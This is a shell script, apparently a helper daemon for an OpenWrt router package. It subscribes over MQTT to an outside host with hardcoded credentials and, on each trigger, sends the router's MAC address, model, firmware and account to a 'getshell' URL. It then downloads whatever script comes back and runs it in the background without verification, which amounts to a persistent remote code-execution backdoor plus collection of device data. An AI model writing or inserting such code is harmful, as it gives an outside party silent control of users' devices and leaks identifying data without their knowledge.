#!/bin/sh

DEV=/dev/natcap_ctl
test -c $DEV || exit 1

HOST=router-sh.ptpt52.com

b64encode() {
	cat - | base64 | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' | sed 's/ //g;s/=/_/g'
}

ACC=$1
ACC=`echo -n "$ACC" | b64encode`
CLI=`cat $DEV | grep default_mac_addr | grep -o '[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]' | sed 's/:/-/g'`
test -n "$CLI" || CLI=`sed 's/:/-/g' /sys/class/net/eth0/address | tr a-z A-Z`

MOD=`cat /etc/board.json | grep model -A2 | grep id\": | sed 's/"/ /g' | awk '{print $3}'`

cd /tmp

mqtt_cli() {
	while :; do
		mosquitto_sub -h $HOST -t "/gfw/device/$CLI" -u ptpt52 -P 153153 --quiet -k 180 | while read _line; do
			echo >/tmp/trigger_natcapd_extra.fifo
		done
		sleep 60
	done
}

main_trigger() {
	local SEQ=0
	. /etc/openwrt_release
	TAR=`echo $DISTRIB_TARGET | sed 's/\//-/g'`
	VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | b64encode`
	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
	while :; do
		test -p /tmp/trigger_natcapd_extra.fifo || { sleep 1 && continue; }
		cat /tmp/trigger_natcapd_extra.fifo >/dev/null && {
			rm -f /tmp/xx.extra.sh
			rm -f /tmp/nohup.out
			UP=`cat /proc/uptime | cut -d"." -f1`
			CV=`uci get natcapd.default.config_version 2>/dev/null`
			ACC=`uci get natcapd.default.account 2>/dev/null`
			URI="/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER&cv=$CV&tar=$TAR&mod=$MOD&seq=$SEQ&up=$UP"
			/usr/bin/wget --timeout=180 --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.extra.sh \
				"https://$HOST$URI" || {
					continue
				}
			head -n1 /tmp/xx.extra.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
				chmod +x /tmp/xx.extra.sh
				nohup /tmp/xx.extra.sh &
			}
			SEQ=$((SEQ+1))
		}
	done
}

main() {
	mkfifo /tmp/trigger_natcapd_extra.fifo
	main_trigger &
	test -p /tmp/trigger_natcapd_extra.fifo && echo >>/tmp/trigger_natcapd_extra.fifo
	while :; do
		sleep 120
		test -p /tmp/trigger_natcapd_extra.fifo && echo >>/tmp/trigger_natcapd_extra.fifo
		sleep 540
	done
}

main_trigger &
main &
mqtt_cli
